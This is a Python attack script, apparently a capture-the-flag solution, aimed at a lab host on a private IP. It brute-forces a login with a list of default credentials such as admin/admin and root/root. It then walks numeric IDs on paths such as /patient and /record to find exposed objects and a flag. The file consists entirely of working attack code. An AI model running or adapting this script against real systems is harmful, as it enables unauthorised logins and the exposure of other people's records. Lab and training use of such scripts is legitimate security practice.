import requests

TARGET_URL = "http://10.0.162.114:5003/login"
BASE_URL = "http://10.0.162.114:5003"

CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "123456"),
    ("test", "test"),
    ("user", "user"),
    ("demo", "demo"),
    ("guest", "guest"),
    ("root", "root"),
    ("administrator", "administrator")
]

def main():
    session = requests.Session()
    headers = {"Content-Type": "application/json"}
    
    valid_creds = None
    
    print("[*] Starting brute force...")
    for username, password in CREDENTIALS:
        payload = {"username": username, "password": password}
        try:
            res = session.post(TARGET_URL, json=payload, headers=headers)
            if res.status_code != 401 and "Login successful" in res.text:
                print(f"[+] Success! Username: {username}, Password: {password}")
                print(f"[+] Response: {res.text}")
                valid_creds = (username, password)
                break
            else:
                print(f"[-] Failed: {username}/{password} - Status: {res.status_code}")
        except requests.RequestException as e:
            print(f"[!] Request error for {username}/{password}: {e}")
            
    if valid_creds:
        print("\n[*] Login successful. Trying to enumerate IDs...")
        paths_to_try = [
            "/", "/user", "/patient", "/record", "/profile", "/dashboard", "/api/user", "/api/patient"
        ]
        
        found_flag = False
        for path in paths_to_try:
            if found_flag:
                break
            for i in range(1, 21):
                target_url = f"{BASE_URL}{path}?id={i}"
                try:
                    res = session.get(target_url)
                    if res.status_code == 200:
                        print(f"[*] ID {i} at {target_url} - Length: {len(res.text)}")
                        if "flag" in res.text.lower() or "ctf" in res.text.lower():
                            print(f"\n[+] FLAG FOUND at {target_url}!")
                            print(res.text)
                            found_flag = True
                            break
                except requests.RequestException:
                    pass
                    
        if not found_flag:
            print("[*] No flag found in common paths with ID 1-20. Manual exploration may be required.")
    else:
        print("\n[-] All credentials failed.")

if __name__ == "__main__":
    main()